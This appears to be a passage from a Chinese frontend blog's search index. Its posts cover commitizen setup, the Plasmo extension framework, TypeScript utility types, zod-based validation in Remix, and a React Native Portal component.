&quot;config&quot;: &#123; &quot;commitizen&quot;: &#123; &quot;path&quot;: &quot;node_modules/cz-git&quot; &#125;&#125; 添加 commit-msg 钩子 1234#!/usr/bin/env sh. &quot;$(dirname -- &quot;$0&quot;)/_/husky.sh&quot;pnpm exec commitlint --edit $&#123;1&#125; 上面的配置都完成后，运行 pnpm cz，按照提示填写 commit 信息： 也可以全局安装 commitizen，之后使用 git cz 命令替换 git commit 命令："},{"title":"初探 Plasm 框架","path":"/2023/07/11/5d26d957a5fc/","content":"Plasm 是什么？Plasmo 是个浏览器插件开发框架，号称浏览器扩展界的 Next.js ！ 其框架提供的特性如下： 一流的 React + Typescript 支持 声明式开发（自动生成 manifest.json） 将 UI 组件渲染到网页 扩展内置页面 扩展热重载 + React 模块热更新 .env* 文件 扩展储存 API 扩展通信 API 远程代码打包 (例如 Google Analytics) 支持多个浏览器和 manifest 版本 通过 BPP 进行自动部署 可选 Svelte 或 Vue 进行开发 安装首先安装一个 React 的模板： 123pnpm create plasmo example-dircd example-dirpnpm dev 如果想使用其他模板，可以使用该命令，可以在此 https://github.com/PlasmoHQ/examples/ 查看所有可用的模板 1pnpm create plasmo --with-env 安装错误： sharp 安装失败 解决方法：https://sharp.pixelplumbing.com/install#chinese-mirrorsharp 的安装包在外网，在国内有可能会下载失败，添加个 npm 代理，使用国内的镜像 12npm config set sharp_binary_host &quot;https://npmmirror.com/mirrors/sharp&quot;npm config set sharp_libvips_binary_host &quot;https://npmmirror.com/mirrors/sharp-libvips&quot; 这两条命令只能在 npm v9 以下的版本生效，用 v9 版本会报错 启动及调试插件 启动很简单使用 pnpm run dev命令即可启动一个开发服务器，启动成功后会在 build目录下生成开发产物： 打开 chrome 的插件管理页面（chrome:&#x2F;&#x2F;extensions&#x2F;），打开【开发者模式】开关，点击【加载已解压的扩展程序】，选择项目中的 build/chrome-mv3-dev目录： 加载成功后可以将其固定到状态栏中，便于后续开发： Plasm 有热重载功能，修改代码后，Plasm 会自动刷新当前激活的 tab，其它 tab 可以点击右下角的按钮手动刷新 各种 PagesPlasm 的文档中有好几种 page，不熟悉浏览器插件的估计会一脸懵逼，这里来总结下各种 page 的作用，以及出现的地点： Page 页面出现地点 说明 代码位置 | extension pages（这些页面是浏览器插件机制内的页面，和 Plasm 框架无关，并且在浏览器中也有实体按钮） | popup page | | 点击状态栏的插件图标后弹出，点击空白地方消失 | popup.tsx或popup&#x2F;index.tsx || | options page | | 右键点击插件图标，选择【选项】栏后，会打开个新页面，这个页面一般用作插件的配置页面 | options.tsx或options&#x2F;index.tsx || | new tab page | | 在点击主页按钮或者新建 tab 页时会打开该页面，同时浏览器的启动页配置会变成插件 这个 page 在开发导航类的插件时会非常有用 | newtab.tsx或newtab&#x2F;index.tsx || | dev tools page | | 在开发者工具中会出现个新的 tab，这个的内容就是该页面 | devtools.tsx或devtools&#x2F;index.tsx || 框架页面（这些页面都是框架提供的，通常以编程方式重定向到或打开这些页面） | tab pages | | 使用场景： 首次安装插件时的欢迎页面 登录鉴权页面 需要更精细的路由控制时 可以在以下 URL 的方式访问这些页面：chrome-extension://&lt;extension-id&gt;/tabs/delta-flyer.html| tabs 目录下 || | sandbox pages | | 这个页面主要用在 iframe 里面，因为和主页面的上下文隔离，安全性更高，可以用来执行一些动态生成的代码 | sandbox.ts file或sandboxes&#x2F;.ts | 各种 Scripts上面介绍了各种 pages 的作用，现在又出现个多个 scripts 同样让人摸不着头脑，这里我们再来总结下他们的作用： script 说明 代码位置 content script content script 会运行在各个 tab 的上下文中，有多少个 tab 页，该脚本就会执行多少次，并且各个 script 不会互相干扰，并且和页面自身的 JavaScript 保持隔离 使用场景： 从当前网页抓取数据 从当前网页中选择、查找元素并设置样式 将 UI 元素注入当前网页 将代码注入“main work”上下文| content.ts或者contents&#x2F;.ts || background service worker | 是一种后台服务，它可以处理一些长时间运行的任务，例如下载文件、缓存数据、推送通知等。这种方式可以节省内存，提高用户体验性，同时在离线状态下，依然能提供一些离线服务每个 tab 下都会有一个独立的 background service worker。这是因为每个 tab 都是一个独立的浏览器窗口，而 service worker 只能在后台运行，不能直接与网页的内容直接进行交互 | background.ts或background&#x2F;.ts | 通信 MessagePlasm 提供的 Message API 便于在各个组件之间的消息的发送，中继以及接收。官方文档介绍其 API 是声明式，类型安全，函数式以及基于 Promise，相比于我们自己封装，Plasm 提供的 API 更加的完善。 Plasm 将 Message API 封装到一个单独的 package 中，使用之前需要安装： 1pnpm install @plasmohq/messaging Message API 的分类如下： 下表中的单词缩写如下：Extension Pages -&gt; Ext-PagesContent Scripts -&gt; CSBackground Service Worker -&gt; BGSW Messaging API From To One-time Long-lived Message Flow Ext-Pages&#x2F;CS BGSW Yes No Relay Flow Website CS&#x2F;BGSW Yes No Ports Ext-Pages&#x2F;CS BGSW No Yes Ports BGSW Ext-Pages&#x2F;CS No Yes Ports + Relay BGSW WebPage Yes Yes Message FlowMessage Flow 非常适合 extension pages，tab pages 或者 content scripts 等前台和 background service worker 后台服务的一次性通信。在将一些繁重的工作扔给后台处理和绕过 CORS 时用此通信方式就非常合适。 具体使用方法见官方文档该位置，这里不过多介绍 Relay Flow 该 API 还不太稳定，谨慎使用 看文档介绍该 API 用于 target webpage 和 background service worker 之间的通信，听着和上面的 Message Flow 很像。 但是研究下官方的示例，发现 Relay Flow 和 Message Flow 的作用截然不同。简单来说，如果 target webpage 也是你开发的，并且需要将 message 传递到配套的插件 background service worker 里，那么就可以将 content scripts 作为中转，完成消息的发送。 该 API 的使用场景还是比较局限的，但是在某些场景下可能会有奇效。 具体使用方法见官方文档该位置，这里不过多介绍 Ports 该 API 还不太稳定，谨慎使用 Messaging Ports API 是对插件原生的 port API 的抽象，主要用于和 background service worker 建立长链接。 具体使用方法见官方文档该位置，这里不过多介绍 存储 Storage环境变量 Environment Variables"},{"title":"TS 中常见工具类型的使用及实现","path":"/2023/06/05/4ff7282e236f/","content":"Pick&lt;Type, Keys&gt; 作用： 从 Type 选择一组 Keys 属性 使用： 123456789101112export interface Todo &#123; remark: string; required: boolean; hobby: string[];&#125;const A: Pick&lt;Todo, &quot;remark&quot; | &quot;required&quot;&gt; = &#123; remark: &quot;111&quot;, required: false,&#125;;// 表示A只能有 remark、required 实现： 12345678910111213141516171819202122232425262728type Pick&lt;T, K extends keyof T&gt; = &#123; [P in K]: T[P];&#125;;// K extends keyof T,这句表示，确保 K 是 T 的子集// keyof: 取 interface 的键后保存为联合类型// in: 取联合类型的值，主要用于数组和对象的构建// 用于实际开发，举个例子：// function getValue(o:object, key: string)&#123;// return o[key]// &#125;// const obj1 = &#123; name: &#x27;张三&#x27;, age: 18 &#125;// const values = getValue(obj1, &#x27;name&#x27;)// 这样写丧失了 ts 的优势：// 无法确定返回值类型// 无法对key进行约束// function getValue&lt;T extends Object,K extends keyof T&gt;(o: T,key: K): T[K] &#123;// return o[key]// &#125;// const obj1 = &#123; name: &#x27;张三&#x27;， age: 18&#125;// const values = getValue(obj1, &#x27;name&#x27;)// 如果第二个参数不是 obj1 中的参数就会报错 Readonly 作用：该 Readonly 会接收一个 _泛型参数_，并返回一个完全一样的类型，只是所有属性都会被 readonly 所修饰。也就是不可以再对该对象的属性赋值。 使用： 123456789101112interface Todo &#123; title: string; description: string;&#125;const todo: Readonly&lt;Todo&gt; = &#123; title: &quot;Hey&quot;, description: &quot;foobar&quot;,&#125;;todo.title = &quot;Hello&quot;; // Error: cannot reassign a readonly propertytodo.description = &quot;barFoo&quot;; // Error: cannot reassign a readonly property 实现： 123456type Readonly&lt;T&gt; = &#123; readonly [P in keyof T]: T[P];&#125;;// readonly修饰符，首先是一个关键字// 对类中的属性成员进行修饰，修饰之后，该属性成员就不能修改了，只能够进行访问","tags":["Typescript"],"categories":["Typescript"]},{"title":"Remix - 表单&接口入参校验","path":"/2023/04/18/40fc3d9c3a91/","content":"前言Remix 是 React Router 团队开发的基于 React 框架的全栈 Web 框架。既然是基于 React 框架，那么在 React 中能够使用的表单校验方案，同样适用于 Remix。 Remix 中的客户端表单校验可以采用 React 的表单校验方案，但是 Remix 作为一个全栈框架，自然是有服务端接口的，那么其入参校验也是否可以采用 node 后端通用的参数校验方案？ 下面我们就看看在前后端都是怎么校验参数的 React 表单校验框架内置校验用过 React 组件库同学应该都知道，这些组件库内部一般都会内置一个表单校验模块，例如 Ant Design ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import React from &#x27;react&#x27;;import &#123; Button, Checkbox, Form, Input &#125; from &#x27;antd&#x27;;const onFinish = (values: any) =&gt; &#123; console.log(&#x27;Success:&#x27;, values);&#125;;const onFinishFailed = (errorInfo: any) =&gt; &#123; console.log(&#x27;Failed:&#x27;, errorInfo);&#125;;const App: React.FC = () =&gt; ( &lt;Form name=&quot;basic&quot; labelCol=&#123;&#123; span: 8 &#125;&#125; wrapperCol=&#123;&#123; span: 16 &#125;&#125; style=&#123;&#123; maxWidth: 600 &#125;&#125; initialValues=&#123;&#123; remember: true &#125;&#125; onFinish=&#123;onFinish&#125; onFinishFailed=&#123;onFinishFailed&#125; autoComplete=&quot;off&quot; &gt; &lt;Form.Item label=&quot;Username&quot; name=&quot;username&quot; rules=&#123;[&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;]&#125; &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label=&quot;Password&quot; name=&quot;password&quot; rules=&#123;[&#123; required: true, message: &#x27;Please input your password!&#x27; &#125;]&#125; &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name=&quot;remember&quot; valuePropName=&quot;checked&quot; wrapperCol=&#123;&#123; offset: 8, span: 16 &#125;&#125;&gt; &lt;Checkbox&gt;Remember me&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Form.Item wrapperCol=&#123;&#123; offset: 8, span: 16 &#125;&#125;&gt; &lt;Button type=&quot;primary&quot; htmlType=&quot;submit&quot;&gt; Submit &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/Form&gt;);export default App; 独立校验模块脱离组件库框架后，前端社区里还是有很多可选的校验模块，这里我只介绍两个我使用过并且绝对特别好用的库： react-hook-form从名字中就能看出，这个库主要适用于 React 框架，因此用原生开发时需要校验表单强烈推荐该库，并且其也能很好的融入现有组件库。 1234567891011121314151617181920212223import &#123; useForm &#125; from &quot;react-hook-form&quot;;export default function App() &#123; const &#123; register, handleSubmit, watch, formState: &#123; errors &#125; &#125; = useForm(); const onSubmit = data =&gt; console.log(data); console.log(watch(&quot;example&quot;)); // watch input value by passing the name of it return ( /* &quot;handleSubmit&quot; will validate your inputs before invoking &quot;onSubmit&quot; */ &lt;form onSubmit=&#123;handleSubmit(onSubmit)&#125;&gt; &#123;/* register your input into the hook by invoking the &quot;register&quot; function */&#125; &lt;input defaultValue=&quot;test&quot; &#123;...register(&quot;example&quot;)&#125; /&gt; &#123;/* include validation with required or other standard HTML validation rules */&#125; &lt;input &#123;...register(&quot;exampleRequired&quot;, &#123; required: true &#125;)&#125; /&gt; &#123;/* errors will return when field validation fails */&#125; &#123;errors.exampleRequired &amp;&amp; &lt;span&gt;This field is required&lt;/span&gt;&#125; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; );&#125; Zod 这个库就是个纯粹的字段校验的库了，正是因为纯粹，社区为其开发了各种适配器，可以将 zod 应用到任何需要字段校验的地方，下面看下 zod 如何应用在 React 表单校验： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; z &#125; from &quot;zod&quot;;import &#123; useZorm &#125; from &quot;react-zorm&quot;;const FormSchema = z.object(&#123; name: z.string().min(1), password: z .string() .min(10) .refine((pw) =&gt; /[0-9]/.test(pw), &quot;Password must contain a number&quot;),&#125;);function Signup() &#123; const zo = useZorm(&quot;signup&quot;, FormSchema, &#123; onValidSubmit(e) &#123; e.preventDefault(); alert(&quot;Form ok! &quot; + JSON.stringify(e.data, null, 2)); &#125;, &#125;); const disabled = zo.validation?.success === false; return ( &lt;form ref=&#123;zo.ref&#125;&gt; Name: &lt;input type=&quot;text&quot; name=&#123;zo.fields.name()&#125; className=&#123;zo.errors.name(&quot;errored&quot;)&#125; /&gt; &#123;zo.errors.name((e) =&gt; ( &lt;ErrorMessage message=&#123;e.message&#125; /&gt; ))&#125; Password: &lt;input type=&quot;password&quot; name=&#123;zo.fields.password()&#125; className=&#123;zo.errors.password(&quot;errored&quot;)&#125; /&gt; &#123;zo.errors.password((e) =&gt; ( &lt;ErrorMessage message=&#123;e.message&#125; /&gt; ))&#125; &lt;button disabled=&#123;disabled&#125; type=&quot;submit&quot;&gt; Signup! &lt;/button&gt; &lt;pre&gt;Validation status: &#123;JSON.stringify(zo.validation, null, 2)&#125;&lt;/pre&gt; &lt;/form&gt; );&#125; 服务端接口入参校验在服务端校验入参本质上就是校验字段，那么先看下其它的 node 服务端框架都是怎么校验参数的： Egg Egg 使用 egg-validate 模块进行参数校验，基本用法如下： 1234567891011121314151617181920212223class XXXController extends app.Controller &#123; // ... async XXX() &#123; const &#123;ctx&#125; = this; ctx.validate(&#123; system : &#123;type: &#x27;string&#x27;, required: false, defValue: &#x27;account&#x27;, desc: &#x27;系统名称&#x27;&#125;, token : &#123;type: &#x27;string&#x27;, required: true, desc: &#x27;token 验证&#x27;&#125;, redirect: &#123;type: &#x27;string&#x27;, required: false, desc: &#x27;登录跳转&#x27;&#125; &#125;); // if (config.throwError === false) if(ctx.paramErrors) &#123; // get error infos from `ctx.paramErrors`; &#125; let params = ctx.params; let &#123;query, body&#125; = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; &#125; // ...&#125; nestjs nestjs 主要使用第三方的 class-validator 来进行参数校验。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus &#125; from &#x27;@nestjs/common&#x27;;import &#123; plainToClass &#125; from &#x27;class-transformer&#x27;;import &#123; validate &#125; from &#x27;class-validator&#x27;;/** * 这是一个全局的参数验证管道，基于class-transformer * 如果失败，则会抛出HttpException * 在main.ts的nestApp要将它设为全局的 */@Injectable()export class ValidationPipe implements PipeTransform &#123; async transform(value: any, &#123; metatype &#125;: ArgumentMetadata) &#123; if (!metatype || !this.toValidate(metatype)) &#123; return value; &#125; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do &#123; const e = errObjList.shift(); if (!e) &#123; break; &#125; if (e.constraints) &#123; for (const item in e.constraints) &#123; errorList.push(e.constraints[item]); &#125; &#125; if (e.children) &#123; errObjList.push(...e.children); &#125; &#125; while (true); if (errorList.length &gt; 0) &#123; throw new HttpException(&#x27;请求参数校验错误:&#x27; + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); &#125; return object; &#125; private toValidate(metatype: Function): boolean &#123; const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); &#125;&#125; 从上面的两个框架可以看出来，对于如何进行参数校验，大家的处理过程都是差不多的，都是先定义一套规则，然后用这套规则去校验字段。 那么在 remix 中校验入参自然也是这个流程，下面的示例中会使用 zod 来校验参数： 12345678910111213141516171819202122import type &#123; ActionArgs &#125; from &quot;@remix-run/node&quot;;import &#123; z &#125; from &quot;zod&quot;;import &#123; parseFormAny, useZorm &#125; from &quot;react-zorm&quot;;const LoginSchema = z.object(&#123; email: z .string(&#123; required_error: &quot;Email is required&quot; &#125;) .email(&#123; message: &quot;Invalid email&quot; &#125;), password: z .string(&#123; required_error: &quot;Password is required&quot; &#125;) .min(8, &#123; message: &quot;Password must be at least 8 characters&quot; &#125;), remember: z.optional(z.boolean()),&#125;);export async function action(&#123; request &#125;: ActionArgs) &#123; const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) &#123; return json(&#123; errors: result.error &#125;, &#123; status: 400 &#125;); &#125;&#125; 前后端校验统一上面分别介绍了如何在前后端校验参数，但是如果是一个前后端分离的项目，那么前后端分开校验并且使用不同的校验方案自然是没有问题的，但是在 remix 这么一个全栈框架里使用两套校验方案，多少显得有些冗余了，而且很容易导致前后端校验不一致的问题。 那么有没有一种方案，可以只写一套校验规则，同时适用于前后端吗？ 自然是可以的，其实上文已经给出了答案，就是使用 zod 来校验参数，下面给出个完整的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135import React from &quot;react&quot;;import &#123; IconBrandGithub, IconBrandTwitter &#125; from &quot;@tabler/icons-react&quot;;import &#123; Link, Form &#125; from &quot;@remix-run/react&quot;;import type &#123; ActionArgs &#125; from &quot;@remix-run/node&quot;;import &#123; json, redirect &#125; from &quot;@remix-run/node&quot;;import &#123; parseFormAny, useZorm &#125; from &quot;react-zorm&quot;;import &#123; z &#125; from &quot;zod&quot;;import LoginLayout from &quot;~/components/user-layout&quot;;import FormInner from &quot;~/components/form/form-inner&quot;;import Input from &quot;~/components/input&quot;;import Button from &quot;~/components/button&quot;;import Checkbox from &quot;~/components/checkbox&quot;;import &#123; loginUser, setAuthSession &#125; from &quot;~/modules/auth&quot;;import &#123; authCookie &#125; from &quot;~/integrations/supabase&quot;;const LoginSchema = z.object(&#123; email: z .string(&#123; required_error: &quot;Email is required&quot; &#125;) .email(&#123; message: &quot;Invalid email&quot; &#125;), password: z .string(&#123; required_error: &quot;Password is required&quot; &#125;) .min(8, &#123; message: &quot;Password must be at least 8 characters&quot; &#125;), remember: z.optional(z.boolean()),&#125;);export async function action(&#123; request &#125;: ActionArgs) &#123; const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(&quot;Cookie&quot;)); if (!result.success) &#123; return json(&#123; errors: result.error &#125;, &#123; status: 400 &#125;); &#125; const &#123; accessToken, refreshToken, error &#125; = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) &#123; return json(&#123; formError: error || &quot;Something went wrong&quot; &#125;, 403); &#125; session = setAuthSession(session, accessToken, refreshToken); return redirect(&quot;/&quot;, &#123; headers: &#123; &quot;Set-Cookie&quot;: await authCookie.commitSession(session), &#125;, &#125;);&#125;const Login: React.FC = () =&gt; &#123; const zo = useZorm(&quot;NewQuestionWizardScreen&quot;, LoginSchema); const renderFooter = () =&gt; ( &lt;&gt; &lt;div className=&quot;hr-text&quot;&gt;or&lt;/div&gt; &lt;div className=&quot;card-body&quot;&gt; &lt;div className=&quot;row&quot;&gt; &lt;div className=&quot;col&quot;&gt; &lt;Button href=&quot;#&quot; icon=&#123;&lt;IconBrandGithub className=&quot;text-github&quot; /&gt;&#125; block &gt; Login with Github &lt;/Button&gt; &lt;/div&gt; &lt;div className=&quot;col&quot;&gt; &lt;Button href=&quot;#&quot; icon=&#123;&lt;IconBrandTwitter className=&quot;text-twitter&quot; /&gt;&#125; block &gt; Login with Twitter &lt;/Button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/&gt; ); return ( &lt;LoginLayout title=&quot;Login to your account&quot; footer=&#123;renderFooter()&#125; description=&#123; &lt;&gt; Don&#x27;t have account yet? &lt;Link to=&quot;/sign-up&quot;&gt;Sign up&lt;/Link&gt; &lt;/&gt; &#125; &gt; &lt;Form ref=&#123;zo.ref&#125; method=&quot;post&quot; replace&gt; &lt;FormInner label=&quot;Email address&quot; required error=&#123;zo.errors.email()?.message&#125; &gt; &lt;Input name=&#123;zo.fields.email()&#125; type=&quot;email&quot; placeholder=&quot;your@email.com&quot; /&gt; &lt;/FormInner&gt; &lt;FormInner label=&quot;Password&quot; required labelSuffix=&#123;&lt;Link to=&quot;/forgot-password&quot;&gt;I forgot password&lt;/Link&gt;&#125; error=&#123;zo.errors.password()?.message&#125; &gt; &lt;Input name=&#123;zo.fields.password()&#125; type=&quot;password&quot; placeholder=&quot;Your password&quot; /&gt; &lt;/FormInner&gt; &lt;div className=&quot;mb-2&quot;&gt; &lt;Checkbox name=&#123;zo.fields.remember()&#125;&gt; Remember me on this device &lt;/Checkbox&gt; &lt;/div&gt; &lt;div className=&quot;form-footer&quot;&gt; &lt;Button buttonType=&quot;submit&quot; type=&quot;primary&quot; block&gt; Sign in &lt;/Button&gt; &lt;/div&gt; &lt;/Form&gt; &lt;/LoginLayout&gt; );&#125;;export default Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"React Native 组件库 - Portal 组件","path":"/2023/04/02/93b995cb58f9/","content":"React 中的 Portal 组件想必对 React 熟悉的同学都不会陌生，它提供了一种将子节点脱离父节点渲染到其它 DOM 节点的方案。 createPortal 文档：https://react.dev/reference/react-dom/createPortal#usage 默认下情况下 JSX 中的元素顺序就是其渲染到真实 DOM 的顺序： 12345678function MyComponent() &#123; return ( &lt;div style=&#123;&#123; border: &quot;2px solid black&quot; &#125;&#125;&gt; &lt;p&gt;This child is placed in the parent div.&lt;/p&gt; &lt;p&gt;This child is placed in the document body.&lt;/p&gt; &lt;/div&gt; );&#125; 渲染后的 DOM 结构如下： 12345678910&lt;body&gt; &lt;div id=&quot;root&quot;&gt; ... &lt;div style=&quot;border: 2px solid black&quot;&gt; &lt;p&gt;This child is placed inside the parent div.&lt;/p&gt; &lt;p&gt;This child is placed in the document body.&lt;/p&gt; &lt;/div&gt; ... &lt;/div&gt;&lt;/body&gt; 使用 createPortal 后 12345678910111213import &#123; createPortal &#125; from &quot;react-dom&quot;;function MyComponent() &#123; return ( &lt;div style=&#123;&#123; border: &quot;2px solid black&quot; &#125;&#125;&gt; &lt;p&gt;This child is placed in the parent div.&lt;/p&gt; &#123;createPortal( &lt;p&gt;This child is placed in the document body.&lt;/p&gt;, document.body )&#125; &lt;/div&gt; );&#125; p 表单虽然还在 div 标签里，但是最终渲染到 DOM 后却在 document.body 里： 12345678910&lt;body&gt; &lt;div id=&quot;root&quot;&gt; ... &lt;div style=&quot;border: 2px solid black&quot;&gt; &lt;p&gt;This child is placed inside the parent div.&lt;/p&gt; &lt;/div&gt; ... &lt;/div&gt; &lt;p&gt;This child is placed in the document body.&lt;/p&gt;&lt;/body&gt; createPortal 因为其脱离父元素的特性，最常见的场景就是 Modal，Drawer 等组件，以 Ant Design 举例： 1234567891011121314151617181920212223242526272829303132333435363738import React, &#123; useState &#125; from &quot;react&quot;;import &#123; Button, Modal &#125; from &quot;antd&quot;;const App: React.FC = () =&gt; &#123; const [isModalOpen, setIsModalOpen] = useState(false); const showModal = () =&gt; &#123; setIsModalOpen(true); &#125;; const handleOk = () =&gt; &#123; setIsModalOpen(false); &#125;; const handleCancel = () =&gt; &#123; setIsModalOpen(false); &#125;; return ( &lt;&gt; &lt;Button type=&quot;primary&quot; onClick=&#123;showModal&#125;&gt; Open Modal &lt;/Button&gt; &lt;Modal title=&quot;Basic Modal&quot; open=&#123;isModalOpen&#125; onOk=&#123;handleOk&#125; onCancel=&#123;handleCancel&#125; &gt; &lt;p&gt;Some contents...&lt;/p&gt; &lt;p&gt;Some contents...&lt;/p&gt; &lt;p&gt;Some contents...&lt;/p&gt; &lt;/Modal&gt; &lt;/&gt; );&#125;;export default App; 在 JSX 中 Button 和 Modal 虽然是在同一级，但是在渲染到真实 dom 后，Modal 却是渲染成 body 的直接子元素： 为什么需要 Portal 组件这是因为我们经常会遇到需要管理组件层级的情况，最常见的就是页面出现多个 Modal，如何管理这些 Modal 就是个很复杂的问题，第一个我们一般会想到用 z-index 调整组件的层级，首先不提手动管理 z-index 合不合理，就是 z-index 本身也不能适用所有场景，它也是有局限性的： 必须是一个定位的（即其 position 属性值不是 static）脱离了文档流的元素，z-index 才能生效 z-index 不一定是值越大越靠前。实际上在 CSS 中元素的层级是由层叠上下文决定的，z-index 只在同一个层叠上下文中比较才有意义，就像省长的秘书和市长的秘书，虽然都是秘书，但是这有可比性吗。看以下代码： 123456&lt;div style=&quot;position:relative; z-index:auto;&quot;&gt; &lt;img src=&quot;mm1.jpg&quot; style=&quot;position:absolute; z-index:2;&quot; /&gt; &lt;-- 横妹子 --&gt;&lt;/div&gt;&lt;div style=&quot;position:relative; z-index:auto;&quot;&gt; &lt;img src=&quot;mm2.jpg&quot; style=&quot;position:relative; z-index:1;&quot; /&gt; &lt;-- 竖妹子 --&gt;&lt;/div&gt; 横妹子 会盖在 竖妹子身上，这是因此两个 img 的父级在同一层叠上下文中，这是 z-index 的大小比较就有了意义。简单修改下，将 z-index:auto改成 z-index:0，这时两张图片的层级就发生了颠倒： 123456&lt;div style=&quot;position:relative; z-index:0;&quot;&gt; &lt;img src=&quot;mm1.jpg&quot; style=&quot;position:absolute; z-index:2;&quot; /&gt; &lt;-- 横妹子 --&gt;&lt;/div&gt;&lt;div style=&quot;position:relative; z-index:0;&quot;&gt; &lt;img src=&quot;mm2.jpg&quot; style=&quot;position:relative; z-index:1;&quot; /&gt; &lt;-- 竖妹子 --&gt;&lt;/div&gt; 这是因为 z-index:0创建了一个层级上下文，这时两个 img 会先比较父元素的层级，而由于两者的层叠顺序一样，会按照 DOM 流的顺序比较层级大小，自然是后面的 竖妹子 覆盖在 横妹子 上，其实这时候子元素的 z-index就是打酱油的，改成任何值都不会影响他们的层级顺序。 不明白什么是 「层叠上下文」的，可以看张鑫旭的这篇文章：https://www.zhangxinxu.com/wordpress/2016/01/understand-css-stacking-context-order-z-index/ 话说回来，用 z-index 来调整层级有这么多限制，肯定是不行的，我们需要的是一个简单高效的方式，这就不得不提 Portal 组件的高明之处了： 由于 Portal 会将子节点脱离父节点所在的上下文，布局就可以不受父节点的影响 Portal 可以将子节点统一插入到 body 中，这是会在同一个层叠上下文中，层级的顺序取决于在在 BOM 流的顺序，也可以说是取决于 Portal 执行的顺序 使用 Portal 组件虽然 Portal 特别贴合某些使用场景，但是 React Native 却没有提供原生的 Portal 组件，我们在 React 中常用的 Portal 组件，是 react-dom 提供的，它只适用于浏览器这样的宿主环境： 1import &#123; Portal &#125; from &quot;react-dom&quot;; 得益于前端活跃到夸张的社区，这类实用的组件自然早早就有了开源方案 - react-native-portal 下面我们看下如何使用这个组件： 安装该组件 12345678## npmnpm install @gorhom/portal## yarnyarn add @gorhom/portal## pnpmpnpm install @gorhom/portal 添加全局 context 12345export const App = () =&gt; ( &lt;PortalProvider&gt; &#123;... your app goes here&#125; &lt;/PortalProvider&gt;); 然后在需要的地方使用 Portal 组件即可 1234567891011const BasicScreen = () =&gt; &#123; return ( &#123; ... &#125; &lt;Portal&gt; &lt;Text&gt; Text to be teleported to the root host &lt;/Text&gt; &lt;/Portal&gt; &#123; ... &#125; );&#125;; 那么所有使用 Portal 组件的子元素都会被插入到 PortalProvider 中，如果需要改变被插入的位置，可以使用 PortalHost自定义插入位置： 1234567const CustomView = () =&gt; &#123; return ( &#123; ... &#125; &lt;PortalHost name=&quot;CustomPortalHost&quot; /&gt; &#123; ... &#125; );&#125;; 更多使用方法见官方文档，这里提个文章没有提到的使用技巧。Portal组件必须要在 React Component 中使用，那么一般的 function 中如何才能使用 Portal： 1234567891011121314151617181920212223// 1. 首先创建个 ref，作为 portal 实例的引用export type PortalService = ReturnType&lt;typeof usePortal&gt;;export const PortalRef = React.createRef&lt;PortalService&gt;() as MutableRefObject&lt;PortalService&gt;;// 2. 在 React Component 中，引用 portal 实例const InitializePortalRef = () =&gt; &#123; const portal = usePortal(); PortalRef.current = portal; return null;&#125;;// 3. 将 InitializePortalRef 组件放置到 PortalProvider 中&lt;PortalProvider&gt; &lt;InitializePortalRef /&gt; &#123;children&#125;&lt;/PortalProvider&gt;// 4. 通过 PortalRef 使用 portal// 注意：PortalRef 只能在 PortalProvider 初始化后使用PortalRef.current?.removePortal(key);PortalRef.current?.updatePortal(key, renderToast());PortalRef.current?.addPortal(key, renderToast()); 实现 Portal 组件上面介绍了如何使用开源社区的 Portal 组件，下面我们就来分析下它是如何实现的，react-native-portal 组件的 API 并不多，只有三个组件 Portal，PortalHost，PortalProvider 和一个自定义 hook usePortal。 先看下 PortalProvider 这个组件内部都做了什么： 123456789101112131415const PortalProviderComponent = (&#123; rootHostName = &quot;root&quot;, shouldAddRootHost = true, children,&#125;: PortalProviderProps) =&gt; &#123; const [state, dispatch] = useReducer(reducer, INITIAL_STATE); return ( &lt;PortalDispatchContext.Provider value=&#123;dispatch&#125;&gt; &lt;PortalStateContext.Provider value=&#123;state&#125;&gt; &#123;children&#125; &#123;shouldAddRootHost &amp;&amp; &lt;PortalHost name=&#123;rootHostName&#125; /&gt;&#125; &lt;/PortalStateContext.Provider&gt; &lt;/PortalDispatchContext.Provider&gt; );&#125;; 这个组件中通过 useReducer 初始化了两个 context： PortalDispatchContext 里面定义了一系列方法，包含 AddUpdatePortalAction，RemovePortalAction, RegisterHostAction，UnregisterHostAction，从名字就能看出来这些方法是做什么的 PortalStateContext 里面存储了上面的一系列方法收集的节点 通过 useReducer 定义的 dispatch 使用起来还是有些繁琐了，所以通过 usePortal 再封装下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import &#123; ReactNode, useCallback, useContext &#125; from &quot;react&quot;;import &#123; ACTIONS &#125; from &quot;../state/constants&quot;;import &#123; PortalDispatchContext &#125; from &quot;../contexts/portal&quot;;export const usePortal = (hostName: string = &quot;root&quot;) =&gt; &#123; const dispatch = useContext(PortalDispatchContext); if (dispatch === null) &#123; throw new Error( &quot;&#x27;PortalDispatchContext&#x27; cannot be null, please add &#x27;PortalProvider&#x27; to the root component.&quot; ); &#125; //#region methods const registerHost = useCallback(() =&gt; &#123; dispatch(&#123; type: ACTIONS.REGISTER_HOST, hostName: hostName, &#125;); // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, 